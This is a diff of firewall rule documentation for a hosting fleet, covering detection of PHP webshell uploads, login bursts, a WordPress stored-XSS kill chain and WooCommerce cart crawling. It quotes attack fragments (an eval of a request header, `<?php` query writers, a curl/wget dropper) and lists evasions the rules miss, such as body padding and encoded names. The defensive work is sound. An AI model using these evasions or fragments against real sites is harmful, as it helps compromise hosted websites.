+Family **`WAF_PHP_WEBSHELL_BODY`**, reasons
+`WAF_PHP_WEBSHELL_BODY:BODY_IS_<KIND>_<CT>`. **Matches** a POST / PUT / PATCH
+body that opens with `<?php` / `<?=` (after an optional BOM and blanks;
+KIND `PHP_FILE`), or a `GIF87a` / `GIF89a` header with a PHP tag in the first
+256 bytes (`GIF_POLYGLOT`). CT names the Content-Type class (`NONE`, `OCTET`,
+`TEXT`, `FORM`, `JSON`, `XML`, `OTHER`). Multipart never matches (402's).
 
-A multipart body never matches (rule 402 reads it). Any other Content-Type
-does, because the test is on the body's first bytes, not its label:
-- a real form body opens with a field name;
-- JSON opens with `{` / `[`;
-- XML opens with `<?xml` or an element.
+**Why shaped this way.** It tests the body's first bytes, not its label, so
+relabelling the upload as a form does not help: a real form body opens with a
+field name, JSON with `{` / `[`, XML with `<?xml` or an element. A form FIELD
+holding PHP (`content=<?php …`) starts with its name and is not matched. A raw
+body that IS a PHP file has no ordinary sender. 404 does not read
+`application/octet-stream` and scores only 2 KB (yavuzshell.php's first
+`eval` is at byte 4 077).
 
-So a dropper cannot pass by relabelling its upload as a form. A form FIELD
-carrying PHP source (`content=<?php …`, the cPanel File Manager editor)
-starts with its name and is not matched. A raw body that IS a PHP file has
-no ordinary sender. Rule 404 does not read
-`application/octet-stream` at all, and its scorer reads only the first 2 KB:
-in yavuzshell.php the first `eval` is at byte 4 077.
+**Scope.** Bodies are read where cfm.lua reads them (a POST to any `*.php`; a
+PUT / PATCH under the size and type gate). Skipped: a PUT / PATCH under
+`/remote.php/` (Nextcloud / ownCloud sync uploads `.php` files raw), and a PUT
+/ PATCH on a cPanel Web Disk host (`webdisk.<domain>`), only under Step 0d's
+gates (`proxysubdomains=1`, `proxysubdomainsoverride=0`, a registrable
+domain), since the Host is the client's.
 
-The access log records no Content-Type or body, so this one could not be
-measured before shipping. The dropper's footprint in the logs (a POST over
-2 KB to a `*.php` with a `.php` name in its query) matched only
-dmkomotinis.gr in 7 days. The burn-in is the measurement: `cfm.waf.log`
-records `ct` with every hit.
-
-Bodies are read where cfm.lua reads them: a POST to every `*.php` path, but
-not an octet-stream body to a clean URL; a PUT / PATCH under the size and
-type gate. A PUT / PATCH under `/remote.php/` (Nextcloud / ownCloud WebDAV)
-is skipped: a sync client uploads a user's `.php` files there as their raw
-body.
+**FP evidence:** the access log holds no Content-Type or body; the dropper's
+footprint (a POST over 2 KB to a `*.php` with a `.php` name in its query)
+matched only dmkomotinis.gr in 7 days. The burn-in above was the measurement.
 
 ### Rule 417 — `rule_php_webshell_body_deep`
 
-Reason `WAF_PHP_WEBSHELL_BODY:DEEP_<404's tag>`, logonly. Rule 404 scores PHP
-source in a textual POST body, but over its first 2 KB only
-(`php_webshell_max_scan_len`). PHP saved through a form field lands wherever
-the file puts it, and two compromises on the fleet passed that way:
+Reason `WAF_PHP_WEBSHELL_BODY:DEEP_<404's tag>`, `logonly`. 404 scores PHP in
+a textual POST body over its first 2 KB only (`php_webshell_max_scan_len`).
+Two compromises passed beyond it: a plugin-editor save with an eval of a
+request header at line 32 (apolymanseisantoniou.gr, orion, 2026-11-15), and a
+file manager saving a shell whose comment header fills the first 2 KB
+(zerooneoliveoil.gr, rigel, 2026-11-17).
 
-- **apolymanseisantoniou.gr (orion, 2026-11-15).** A plugin-editor save
-  (`admin-ajax.php`, `action=edit-theme-plugin-file`). Its `newcontent` held,
-  at line 32 of the plugin, `$a = $_SERVER; … eval\n($a[\n$k]\n);`, an
-  eval of a request header. The later saves had the eval in the head, and
-  404 caught them.
-- **zerooneoliveoil.gr (rigel, 2026-11-17).** A file manager's `cmd=put`,
-  then the shell's own editor, saving "Simple File Manager - ULTIMATE
-  ANTI-BLANK & WAF BYPASS". Its comment header fills the first 2 KB.
+**Matches:** 404's scorer over the whole body the edge read
+(`php_webshell_deep_scan_len`, 32 KB = `waf_body_max_len`), only when 404
+scored nothing, and only after a cheap raw check finds a scorer marker
+(`PHP_SCORE_MARKERS`) or an escape that may decode to one (`%3C`, `%3F`,
+`%24`, `%5F`, `%25`, `\u00`; not `%20` / `%2F` / `%3D`, which are in nearly
+every form). It also scores each multipart text field alone, as PHP hands it
+over (file parts stay 402 / 415's), and decodes a JSON body's `\u00XX` / `\/`
+escapes as `json_decode` does (404's head pass does not). A body within 2 KB
+is read only where 404 could not read it as PHP gets it, or when 404 is off.
+With `php_webshell_min_score` below 5 the raw check is off. **Residual:** a
+score of 5 without `<?` / `$_` needs a callable or webshell name, and one
+spelled with %-encoded letters is not read.
 
-**What it does.** Rule 417 runs the same scorer over the whole body the edge
-read (`php_webshell_deep_scan_len`, 32 KB = `waf_body_max_len`):
-- only when 404 scored nothing. A body no longer than 404's 2 KB head is read
-  only where 404 could not read it as PHP gets it (a multipart body, a JSON
-  body with escapes) or when 404 is disabled;
-- only after a cheap raw check finds one of the scorer's markers
-  (`PHP_SCORE_MARKERS`: `<?`, `$_`, the global callables it counts, the
-  webshell names) or an escape that may decode to one (`%3C`, `%3F`, `%24`,
-  `%5F`, `%25`, `\u00`). Not `%20` / `%2F` / `%3D`, which are in nearly every
-  form body. The scorer's own early-out reads the same list. A score of 5
-  with no `<?` / `$_` needs a callable or a webshell name; one spelled with
-  %-encoded letters is not read (residual). With `php_webshell_min_score`
-  below 5 the check is off.
+The same reviews fixed 404: it reads a body's media type as PHP does (an
+urlencoded body with `multipart/form-data` in a Content-Type parameter was
+read by neither rule), and its early-out admits `assert` / `popen` /
+`proc_open`.
 
-**Also read** (review, 2026-11-17):
-- a multipart body's plain **text** fields, each scored on its own and as PHP
-  hands them to the app: not percent-decoded (a save form posted as
-  multipart; file parts stay 402 / 415's). Multipart is decided by the media
-  type, as PHP does, and the boundary is read from every Content-Type line;
-- a JSON body's `\u00XX` / `\/` escapes, as `json_decode` hands them to the
-  app (`\u003c?php`, `\u0024_POST`). 417 only: 404's head pass ships at
-  challenge_v2 and does not decode them.
+**Order.** Runs late, after every rule but 612 and 530: earlier, it took the
+headline (and the push) from the logonly body rules after it (a
+`wget || curl` dropper reported 417 instead of 331). It shows in
+`also_rule_ids` instead.
 
-**404 changes from the same reviews.** 404 now reads a body's media type the
-way PHP does: an urlencoded body whose Content-Type carried
-`multipart/form-data` in a parameter was read by neither rule. Its early-out
-now admits `assert` / `popen` / `proc_open`, which it scores but used to drop
-before scoring.
+**Cost.** ~0.17 ms on a 20 KB form with no marker; nothing on a short body
+404 already read; ~+0.4 ms on a 30 KB post with HTML; ~+5 ms on a 30 KB PHP
+file saved through an editor (rare).
 
-**Order.** 417 runs late, after every rule but 612 and 530. cfm.lua pushes
-only the headline hit, and at step 15 (next to 404) 417 took the headline,
-and the push, from the logonly body rules that run after it. A `wget || curl`
-dropper reported 417 instead of 331, whose burn-in then lost it. Those rules
-now keep the headline, and 417 shows in `also_rule_ids`.
-
-**Cost.** On a body past 2 KB with no marker, a lowercased copy and about 20
-plain finds: ~0.17 ms on a 20 KB form. A short body 404 already read costs
-nothing. About +0.4 ms on a 30 KB post with HTML. About +5 ms on a 30 KB PHP
-file saved through an editor, which is rare.
-
-**Logonly through burn-in.** A whole legitimate plugin file saved through an
-editor is scored too: a global `exec(` / `system(` call plus a superglobal
-reaches 5. Read its hits fleet-wide before any promotion. Multipart file
-parts stay with 402 / 415.
+**Why logonly.** A whole legitimate plugin file saved through an editor is
+scored too (a global `exec(` / `system(` plus a superglobal reaches 5). Read
+its hits fleet-wide before any promotion.
 
 ### Fleet read of 702, 10029 and 415 (2026-11-17, 14 days, 8 nodes)
 
 | Rule | Hits | What they were | Decision |
 |---|---:|---|---|
 | 10029 Fabrik `[eval]` | 10 | all `EVAL_ZERO` (`[eval]=0`) from Greek users on three Fabrik sites (Fabrik's own form); `EVAL_ARG` only from the dmkomotinis attacker | **block**, armed (WAF_CVE): the first probe bans |
-| 702 C2 tunnel | 355 | 176 `RENTRY` on `zort.me/shorten` (a URL shortener we host: the known FP source of 611); the rest comment spam with tunnel links, a Joomla `component/ajax` poller, `/wp-22.php?sfilecontent=<?php` writers | stays `challenge_v2`; `zort.me` needs a rule-scoped exclude (operator) |
-| 415 upload deep | 2 | both `/wp-admin/async-upload.php` from Greek admins (media library) | stays logonly; its tag now names the file's extension (`UPLOAD_PHP_TAG_DEEP:<ext>`), since the log could not say what was uploaded |
-
-### Both rules
-
-Both are `block` now. 332's family `WAF_RCE` is autoblock-armed, so a 332
-hit bans. 416 holds its own ban (`HoldAutoblock`, `RULE_416 = 0`): the
-`WAF_PHP_WEBSHELL_BODY` family is armed but 416 bans nothing until that hold
-is lifted.
-
-Tests: `scripts/tests/cfm_waf_php_code_args_test.lua`.
+| 702 C2 tunnel | 355 | 176 `RENTRY` on `zort.me/shorten` (a URL shortener we host, the known FP source of 611); the rest comment spam with tunnel links, a Joomla `component/ajax` poller, `/wp-22.php?sfilecontent=<?php` writers | stays `challenge_v2`; `zort.me` needs a rule-scoped exclude (operator) |
+| 415 upload deep | 2 | both `/wp-admin/async-upload.php` from Greek admins (media library) | stays logonly; its tag now names the file's extension (`UPLOAD_PHP_TAG_DEEP:<ext>`) |
 
 ## Rule 501 — `rule_auth_burst` (login submissions)
 
-Counts credential **submissions** per IP across vhosts: `auth_burst_threshold` (8)
-in `auth_window_sec` (20 s), then the rule's mode (`challenge_v2`). A request counts
-only when it is a POST to a login endpoint whose body carries a password field, read
-the way PHP reads it (`php_request_fields`): WordPress `wp-login.php` `pwd`, Drupal
-`/user/login` `pass`, Joomla `/administrator/index.php` `passwd`, OpenCart
-`/admin/index.php` and custom `…/login` forms `password` / `pass` / `pwd` / `passwd`,
-Magento's `login[username]` + `login[password]` (two `login` values) on any of those
-endpoints, or on its admin route (an `admin` path segment) alone, and phpMyAdmin's login
-form (`pma_password` in a POST to a `phpmyadmin` path; since 2026-10-22 — its queries,
-saves and imports carry no password field and never count). The query's `route` /
-`_format` are read as PHP registers them in `$_GET` (`%5Fformat`, `.format`), the route
-after its leading blanks as OpenCart 4 trims it.
-A JSON body (by media type or a leading `{`) counts by one of those keys, its `\u00XX`
-escapes decoded; Drupal's REST login (`/user/login?_format=…`) counts whatever the body,
-since Drupal decodes it by `_format`. A GET of the login page and admin navigation never
-count; XML-RPC is left to 510-512.
+Family `WAF_AUTH_BURST`, `challenge_v2`. Counts credential **submissions** per
+IP across vhosts: `auth_burst_threshold` (8) in `auth_window_sec` (20 s), then
+the rule's mode.
 
-A POST to a **login-only** endpoint (`wp-login.php`, `/user/login`, `…/login`,
-`/admin/login`, Magento's admin login paths, OpenCart's `route=common/login`) whose body
-the edge cut at `waf_body_max_len` (32 KB), or did not read (Content-Length larger than
-what was read, or no Content-Length and nothing read, as on HTTP/3), counts by its path,
-as the rule always did: no login form is that big, and padding would otherwise push the
-password past the cut, where PHP still reads it. The Joomla / OpenCart admin index serves
-every admin action, so a big body there (a media upload, a long article) is not counted;
-residual: a Joomla admin login padded past the cut (it posts a session CSRF token too).
+**Counts** a POST to a login endpoint whose body carries a password field,
+read as PHP reads it (`php_request_fields`): WordPress `wp-login.php` `pwd`;
+Drupal `/user/login` `pass`; Joomla `/administrator/index.php` `passwd`;
+OpenCart `/admin/index.php` and custom `…/login` forms `password` / `pass` /
+`pwd` / `passwd`; Magento `login[username]` + `login[password]` (on those, or
+on its admin route alone); phpMyAdmin `pma_password` on a `phpmyadmin` path.
+`route` / `_format` are read as PHP registers them (`%5Fformat`, `.format`;
+the route after leading blanks, as OpenCart 4 trims it). A JSON body counts
+by the same keys, `\u00XX` decoded; Drupal's REST login
+(`/user/login?_format=…`) counts whatever the body. Login-page GETs and admin
+navigation never count; XML-RPC is 510-512's.
 
-Since 2026-10-09. Before that the rule counted every request to those paths (an
-OpenCart admin browsing `/admin/index.php?route=…` or a Joomla admin saving was
-challenged after 8 pages), and it skipped every client that is its own TCP peer, so it
-only ever ran behind a trusted proxy (Cloudflare). Direct clients now count too, capped
-at `auth_burst_direct_mode` (never stronger than `rule_auth_burst`; an unknown value
-reads as `logonly`); a proxied client keeps the rule's mode. The cap was `logonly` for a
-burn-in and is `challenge_v2` (the rule's own mode) since 2026-10-13. The burn-in read
-(86 h, six nodes, `cfm.waf.log`): ~1 850 direct hits, nearly all `AUTH_WP_LOGIN`, all
-but 9 single hits from hosting / VPN / Tor ASNs (one node's ~1 460 from ~11 Oracle Cloud
-IPs spraying `wp-login.php` across vhosts, `cpanel.` / `webmail.` subdomains included),
-no Greek ISP, no relay (QUIC.cloud, Sucuri, an office NAT) and no admin retrying their own
-login. Set `auth_burst_direct_mode = "logonly"` in `cfm_waf_config.lua` to step back; an
-untrusted relay that appears later reads as one direct client across every vhost, so
-look for one in `waf_rule_detail 501` before blaming the rule.
+**Padded bodies.** A POST to a **login-only** endpoint (`wp-login.php`,
+`/user/login`, `…/login`, `/admin/login`, Magento's admin login paths,
+OpenCart `route=common/login`) whose body the edge cut at
+`waf_body_max_len` (32 KB) or did not read counts by its path: no login form
+is that big, and padding would push the password past the cut. The Joomla /
+OpenCart admin index serves every admin action, so a big body there does not
+count.
 
-The panel ports (cPanel / WHM / webmail) read no body and say so (`body_unread`), so 501
-never runs there;
-cPanel's own `login_log` detector (`internal/detectors/cpanel`) bans repeated failures,
-which the edge cannot tell from successes.
+**Direct clients** are capped at `auth_burst_direct_mode` (default
+`challenge_v2`; never stronger than `rule_auth_burst`; an unknown value reads
+as `logonly`); a proxied client gets the rule's mode. Burn-in (86 h, six
+nodes): ~1 850 direct hits, all but 9 single hits from hosting / VPN / Tor
+ASNs, no Greek ISP, no relay (QUIC.cloud, Sucuri, an office NAT), no admin
+retrying a login. Step back with `auth_burst_direct_mode = "logonly"`. An
+untrusted relay reads as one direct client across every vhost: look for one
+in `waf_rule_detail 501` before blaming the rule.
 
-**A client holding a valid clearance** (since 2026-11-04). The post-clearance
-conversion (`post_clearance_action`) turns a challenge-tier hit into `logonly` for a
-cleared client, so it is never challenged again; for 501 that meant a client that solved
-the challenge once could post logins without limit from its IP. cfm.lua now refuses the
-cleared client's submissions that cross the threshold (403, `X-CFM-Action:
-login_capped_pc`) until the window closes (`auth_window_sec`), and pushes the hit as
-`logonly` as before, so it never earns a `waf_security` ban; a `login_capped_pc` line in
-the edge error log records the refusal (cfm.waf.log and the history read logonly). 501 counts wherever it
-sits in the hit list: an equal-tier rule that runs earlier (302 on a `<script` arg)
-takes the headline, and keying on the headline let a cleared client switch the cap off
-with one junk argument. A resumed POST (the stashed login a client was challenged for,
-replayed after the solve) is let through once per IP per window, the counter's own grain
-(501 counts per IP across vhosts): a client can
-mint resume tokens by posting without its cookie. In the three weeks before
-(2026-10-14 → 11-04, seven nodes, `cfm.waf.log`) 501 fired ~15 800 times, all at
-`challenge_v2` but 7 converted ones, and those 7 were Greek ISPs, a `cpanel.` login and an
-office tool: a ban would have hit them, a 20-second refusal does not hurt them. A cleared
-client posting at the cap still gets ~21 tries a minute (plus one resumed login per
-window, about 3 a minute, if it mints resume tokens); banning that is the job of a
-failed-login count in the web detector, which can see the origin's answer (planned, see
-`docs/ROADMAP.md`).
+**Cleared clients.** `post_clearance_action` makes a challenge-tier hit
+`logonly` for a cleared client, so one solve would allow unlimited logins.
+cfm.lua refuses a cleared client's submissions past the threshold (403,
+`X-CFM-Action: login_capped_pc`, a `login_capped_pc` edge error-log line) until
+the window closes, and pushes the hit as `logonly`, so it never earns a ban.
+501 counts wherever it sits in the hit list (keying on the headline let one
+junk `<script` arg, 302, switch the cap off). A resumed POST passes once per
+IP per window. Evidence: in three weeks 501 fired ~15 800 times, all
+`challenge_v2` but 7 converted hits from real users (Greek ISPs, a `cpanel.`
+login, an office tool); a ban would have hit them, a 20 s refusal does not. A
+cleared client at the cap still gets ~21 tries a minute; banning that needs a
+failed-login count that sees the origin's answer (planned, `docs/ROADMAP.md`).
 
-Not counted (the path test reads `ngx.var.uri`, no query string): Drupal 7
-`/index.php?q=user/login`, Joomla `POST /administrator/` (the directory index), Joomla's
-frontend login (`/index.php?option=com_users&task=user.login`), WooCommerce
-`/my-account/`, Adminer, a password sent in a POST's query string, OpenCart 3's login padded past the cut
-on any route but `common/login` (a logged-out POST anywhere reaches its login controller),
-Magento's admin login padded past the cut on its bare route (`/admin/…`, where big bodies are saves), and field
-names outside the list (`session[password]`, Symfony `_password`, an array-wrapped or
-BOM-prefixed JSON body). An OpenCart admin
-customer save sends an empty `password=` and counts; eight in 20 s is not a workflow.
+**Panel ports** read no body (`body_unread`), so 501 never runs there;
+cPanel's `login_log` detector (`internal/detectors/cpanel`) bans repeated
+failures.
+
+**Not counted** (the path test reads `ngx.var.uri`): Drupal 7
+`/index.php?q=user/login`; Joomla `POST /administrator/` and its frontend
+login (`option=com_users&task=user.login`); WooCommerce `/my-account/`;
+Adminer; a password in a POST's query string; a Joomla admin login, an
+OpenCart 3 login on any route but `common/login`, or a Magento admin login on
+its bare route, padded past the cut; field names outside the list
+(`session[password]`, Symfony `_password`, an array-wrapped or BOM-prefixed
+JSON body). An OpenCart admin customer save sends an empty `password=` and
+counts; eight in 20 s is not a workflow.
 
 ## Rule 503 — `rule_wp_admin_cross_screen` (a stored XSS driving an admin's browser)
 
-Reason family **`WAF_ADMIN_XSCREEN`**, logonly. A stored XSS needs no exploit
-to take a WordPress site: its script runs in an administrator's browser with
-that session's cookie and nonces, and every request it sends is a legitimate
-admin request. On tophair.gr (2026-10-06) staff opened an order carrying the
-PixelYourSite payload (CVE-2026-1844); within five seconds their own browser
-fetched `user-new.php` and `plugin-install.php?tab=upload` for the nonces,
-POSTed `user-new.php` (a new administrator) and
-`update.php?action=upload-plugin` (a backdoor plugin as a ZIP), all with the
-**order screen** as the Referer. No content rule could see it: the user is
-logged in, the plugin is compressed, nothing in the body is an attack.
+Family **`WAF_ADMIN_XSCREEN`**, `logonly`. A stored XSS runs in an
+administrator's browser with their cookie and nonces, so every request it
+sends is a legitimate admin request. On tophair.gr (2026-10-06, PixelYourSite
+CVE-2026-1844) staff opened an order, and within five seconds their browser
+fetched nonces, created an administrator and uploaded a backdoor plugin, all
+with the **order screen** as Referer. No content rule could see it.
 
-What gives it away is where the request came from. WordPress submits these
-forms only from their own screen, as a navigation a click started:
+**Signal: where the request came from.** WordPress submits these forms only
+from their own screen, as a navigation a click started. Only with a
+`wordpress_logged_in_` cookie.
 
 | tag | signal |
 |---|---|
-| `<EP>:SCRIPT` / `<EP>:FRAME` | any `Sec-Fetch-Dest` but `document`: framed (`iframe`, `frame`, `object`, `embed`) is FRAME, the rest (fetch/XHR `empty`, `<img>`, `<script>`, …) SCRIPT. A script can set a same-origin Referer (`fetch(…, {referrer})`) or drop it (a meta referrer policy), but not Fetch Metadata. |
-| `<EP>:FROM:<screen>` | a same-host Referer from another admin screen (`post.php`, `admin.php`, …) or the front end (`front`). |
+| `<EP>:SCRIPT` / `<EP>:FRAME` | `Sec-Fetch-Dest` other than `document` (framed = FRAME). A script can set or drop the Referer, not Fetch Metadata. |
+| `<EP>:FROM:<screen>` | a same-host Referer from another admin screen or the front end (`front`). |
 | `<EP>:CROSS_SITE` | `Sec-Fetch-Site: cross-site`. |
-| `<EP>:NO_ACTIVATION` | a document navigation (`Sec-Fetch-Mode: navigate`, `Dest: document`) without `Sec-Fetch-User`: a `form.submit()` no click started. |
-| `<EP>:NO_REFERER` | an XHR leg (admin-ajax, REST) called same-origin (`Sec-Fetch-Site`) with no Referer or a bare origin; a WordPress admin page sends the full URL (`strict-origin-when-cross-origin`). |
-| `NONCE_SCRAPE:<screen>` / `NONCE_FRAME:<screen>` | a GET of a nonce-bearing screen (`user-new.php`, `users.php`, `user-edit.php`, `profile.php`, `site-users.php`, `plugins.php`, `plugin-install.php`, `theme-install.php`, `options-general.php`, the file editors) by a script or markup (not a `Sec-Purpose: prefetch`), or framed (not `plugin-install.php?tab=plugin-information`, WordPress's own thickbox). |
+| `<EP>:NO_ACTIVATION` | a document navigation without `Sec-Fetch-User`: a `form.submit()` no click started. |
+| `<EP>:NO_REFERER` | an XHR leg (admin-ajax, REST) with no Referer or a bare origin; an admin page sends the full URL. |
+| `NONCE_SCRAPE:<screen>` / `NONCE_FRAME:<screen>` | a GET of a nonce-bearing screen by script or markup (not `Sec-Purpose: prefetch`), or framed (not plugin-install's own thickbox). |
 
-`<EP>` is (WordPress reads these from `$_REQUEST`, so the legs match any
-method that carries the action):
-- `USER_NEW` (`user-new.php`: any POST, or a GET `action=adduser` /
-  `createuser`), `USER_EDIT` (`user-edit.php`), `PROFILE` (`profile.php`, also
-  from `user-edit.php`: saving your own account there posts to `profile.php`),
-  `SITE_USERS` (multisite `site-users.php`, incl. `remove`);
-- `USERS` (`users.php`: a POST, or `action=dodelete` / `doremove`) and
-  `USERS_ROLE` (its role change: `changeit` / `changeit2` / `action=promote`,
-  which WordPress sends as a **GET** of the list's own form);
-- `OPTIONS_GENERAL` (`options.php` with `option_page=general`:
-  `users_can_register`, `default_role`, `new_admin_email`; from
-  `options-general.php`). Other `option_page`s are out of scope: plugin
-  settings pages post to `options.php` from `admin.php?page=…`;
-- `UPLOAD_PLUGIN` / `UPLOAD_THEME` (`update.php?action=upload-…`, POST or
-  the GET that installs an uploaded package, `&package=<attachment id>`; from
-  the install screen or `update.php`) and `INSTALL_PLUGIN` / `INSTALL_THEME`
-  (`update.php?action=install-…`, the wordpress.org install; from
-  `plugin-install.php`, or `theme-install.php` / `themes.php`). An
-  `update.php` POST whose action lies past the edge's body window is `UPLOAD`
-  (update.php takes nothing but uploads by POST);
-- `ACTIVATE` (`plugins.php` `action=activate` / `activate-selected`, and
-  `update.php?action=activate-plugin`, which also includes the plugin under
-  `failure=true`): Fetch Metadata only, never the Referer, as themes and
-  plugins put "Activate" links on their own pages;
-- `FILE_EDITOR`: a POST to `theme-editor.php` / `plugin-editor.php` (the
-  non-AJAX save) from its own screen, and admin-ajax
-  `edit-theme-plugin-file`; `AJAX_PLUGIN`
-  (admin-ajax `install-plugin` / `activate-plugin`, from `plugins.php` /
-  `plugin-install.php`): Referer and `NO_REFERER` only, as admin-ajax is always
-  XHR. A spoofed Referer is a residual;
-- `REST_USERS`, `REST_APP_PASSWORD`, `REST_PLUGINS`: a cookie-authenticated
-  REST write, routed as WordPress routes it. Every `rest_route` field (any
-  spelling PHP registers: `rest.route`, `rest[route`, an encoded name) is a
-  candidate and overrides the `/wp-json/` path. Routes match
-  case-insensitively after untrailingslashit (every trailing `/` or `\`),
-  and PCRE's `$` also matches before one final newline (`%0A`). A
-  `rest_route` on a path WordPress's rewrite sends to `index.php` counts too,
-  even under `/wp-admin/`. A GET counts as a write under `_method` or
-  `X-HTTP-Method-Override`.
-  - `/wp/v2/users` and `/users/<id>`: any write, and no screen is allowed, so
-    any Referer is logged (`FROM:<screen>`).
-  - `/users/me`: only a write naming an account field (`email`, `password`,
-    `roles`, `username`) as a JSON or form KEY, not a value that mentions it.
-    The block editor (`persisted_preferences`) and wc-admin
-    (`woocommerce_meta`) save their preferences there.
-  - `/users/<id|me>/application-passwords`: allowed from `profile.php`,
-    `user-edit.php` and `authorize-application.php`, the screens that create
-    them.
-  - `/wp/v2/plugins`: allowed from `plugins.php` / `plugin-install.php`. The
-    block editor's block directory installs plugins from `post.php`, so
-    `REST_PLUGINS:FROM:post.php` needs a look in the burn-in.
+**Legs (`<EP>`):** `USER_NEW`, `USER_EDIT`, `PROFILE`, `SITE_USERS`, `USERS`,
+`USERS_ROLE` (the role change WordPress sends as a GET), `OPTIONS_GENERAL`
+(`options.php` with `option_page=general` only: plugin settings pages post to
+`options.php` from `admin.php?page=…`), `UPLOAD_PLUGIN` / `UPLOAD_THEME` and
+`INSTALL_PLUGIN` / `INSTALL_THEME` (`update.php`; a POST whose action lies past
+the body window is `UPLOAD`), `ACTIVATE` (Fetch Metadata only: themes and
+plugins put "Activate" links on their own pages), `FILE_EDITOR` and
+`AJAX_PLUGIN` (Referer and `NO_REFERER` only), and `REST_USERS`,
+`REST_APP_PASSWORD`, `REST_PLUGINS` (cookie-authenticated REST writes, routed
+as WordPress routes them, `rest_route` in any spelling PHP registers). Which
+screen each is allowed from is in `cfm_waf_detectors.lua` (`XSC`); notable:
+`/users/me` counts only a write naming `email`, `password`, `roles` or
+`username` as a KEY (the block editor and wc-admin save preferences there),
+and `REST_PLUGINS:FROM:post.php` (the block directory) needs a look in the
+burn-in. Fields are read as PHP registers them, any value rather than PHP's
+last (a trailing duplicate past `max_input_vars` is a decoy). The screen is
+what follows the first `/wp-admin/`, cut at its `.php`. No Referer is no
+signal (a `no-referrer` policy); a cross-host Referer without
+`Sec-Fetch-Site` is left to the nonce.
 
-Fields are read as PHP registers them (`php_request_fields`), any value rather
-than PHP's last (the project's rule: a trailing duplicate past
-`max_input_vars` is a decoy PHP never saw). The admin screen is what follows
-the FIRST `/wp-admin/` (as WordPress's `$pagenow`; subdirectory installs keep
-their prefix), without the multisite `network/` and `user/` prefixes, cut at
-its `.php` (Apache's AcceptPathInfo runs `user-new.php/x` as
-`user-new.php`). A bare-origin Referer (`Referrer-Policy: origin` /
-`strict-origin`: `https://host/`, never a query) names no screen. On a form
-it is no signal, like a missing one; on an XHR leg it counts as missing
-(`NO_REFERER`). A `/` with a query (plain permalinks, `/?product=x`) is the
-front end.
+**Order.** Runs last but 612 and 530, after every armed block rule, so a held
+block promotion cannot take the headline and end evaluation before an armed
+rule's ban. **Push window:** the leg stays in the push key
+(`PUSH_KEY_KEEPS_TAG`); a family-keyed window logged only the first leg of a
+kill chain (the nonce scrape).
 
-The step runs last but 612 and 530, after every armed block-tier rule, because a
-block promotion must hold the autoblock: a held block evaluated earlier takes
-the headline and ends evaluation before an armed rule's ban.
-
-Only with a `wordpress_logged_in_` cookie. No Referer is no signal (a
-`no-referrer` policy), and a cross-host Referer without `Sec-Fetch-Site` is
-left to the nonce. `options.php` is out of scope: plugin settings pages post
-to it from `admin.php?page=…` (nine distinct screens on titan).
-
-**Push window.** `WAF_ADMIN_XSCREEN` keeps its leg in the push key
-(`PUSH_KEY_KEEPS_TAG`): a kill chain sends several legs from one IP within
-seconds, and a family-keyed window logged only the first (the nonce scrape,
-not the user or the plugin). A flood of one leg still collapses to one push
-per window.
-
-**Limits (what four review rounds taught).** A rule that enumerates WordPress's
-privileged endpoints is never complete: core alone has many routes to the
-same outcome, every round found more, and plugins add their own. 503 is a
-detector for the stored-XSS kill chain as it is run today. It is not a seal.
-Known residuals:
+**Not covered.** Enumerating WordPress's privileged endpoints is never
+complete (four review rounds each found more; plugins add their own). 503
+detects the kill chain as run today; it is not a seal:
 - an action no leg lists;
-- a body padded past the edge's body window, which hides a field: the same
-  limit every body rule has;
-- a spoofed Referer on an XHR leg (admin-ajax, REST), where Fetch Metadata
-  cannot help;
-- a browser without Fetch Metadata (Safari < 16.4), where only the Referer
-  speaks.
+- a body padded past the body window;
+- a spoofed Referer on an XHR leg, where Fetch Metadata cannot help;
+- a browser without Fetch Metadata (Safari < 16.4).
 
-The backstop for all of these is watching the outcome, not the request: a new
-administrator, a new plugin or a PHP file written by the web user (see the
-2026-10-27 gap analysis, D1/D2).
+The backstop is watching the outcome (a new administrator, a new plugin, a PHP
+file written by the web user; gap analysis D1/D2).
 
-**FP baseline (titan, 545 access logs, 2026-09/10):** `user-new.php` 53 POSTs
-from its own screen + 1 other; `upload-plugin` 332 from `plugin-install.php`
-+ 1 without a Referer + 1 other; `users.php` 108 and `upload-theme` 13, all
-from their own screen. Both "other" were the tophair attack. The access logs
-carry no Fetch Metadata, so the SCRIPT / NO_ACTIVATION signals have no
-baseline yet: the burn-in measures them.
+**FP baseline** (titan, 545 access logs, 2026-09/10): `user-new.php` 53 POSTs
+from its screen + 1 other; `upload-plugin` 332 from `plugin-install.php` + 1
+without Referer + 1 other; `users.php` 108 and `upload-theme` 13, all from
+their screen. Both "other" were the tophair attack. Access logs hold no Fetch
+Metadata, so SCRIPT / NO_ACTIVATION have no baseline yet.
 
-**Promotion.** The client IP is the victim's (a staff member's browser), never
-the attacker's: a block promotion must set `HoldAutoblock` on rule 503 so the
-edge 403s without an nft ban. A hit means the site already stores a payload
-in something an administrator just opened (an order, a comment, a product
-review, a form entry): find and clean it, as the PixelYourSite clean-up did
-for `pys_enrich_data`.
+**Promotion.** The client IP is the victim's browser: a block promotion must
+set `HoldAutoblock` on 503 (edge 403, no nft ban). A hit means the site stores
+a payload in something an admin just opened (an order, comment, review, form
+entry): find and clean it, as was done for PixelYourSite's `pys_enrich_data`.
 
 ## Rule 530 — `rule_wc_cart_get_crawl` (WooCommerce add-to-cart crawling)
 
-Reason family **`WAF_CART_CRAWL`**, logonly. WooCommerce adds a product to
-the cart for any request with `add-to-cart=<id>`, and its listings print that
-link on every product. Crawlers follow it, and each request starts a session
-and writes a cart to the shop's database, uncached, at 1-3 s of PHP.
+Family **`WAF_CART_CRAWL`**, `logonly`, a cost signal. WooCommerce adds to the
+cart for any `add-to-cart=<id>` request, and listings print that link on every
+product. Each crawled request starts a session and writes a cart, uncached,
+at 1-3 s of PHP. One day on six nodes (2026-11-17): ~265 000 such GETs, mostly
+self-declared crawlers (meta-externalagent, meta-webindexer,
+SERankingBacklinksBot, ClaudeBot, Claude-SearchBot); the rest from rotating
+residential addresses with a browser UA, one or two each (Imunify360's "GET
+add-to-cart flood pattern": 7 082 addresses in two days on earth), which
+per-IP counting never sees. ~37 h of backend time a day on mars.
 
-Measured on 2026-11-17 over one day of edge logs on six nodes: about 265 000
-such GETs. Most came from self-declared crawlers:
-- meta-externalagent: 47 000 on mars, and 65 000 on titan in five hours;
-- meta-webindexer, SERankingBacklinksBot, ClaudeBot and Claude-SearchBot.
+**Matches** a `GET` / `HEAD` with `add-to-cart` in the query (name read as PHP
+reads it, case-sensitive) and a value holding a digit. Tags: `CRAWLER` (a
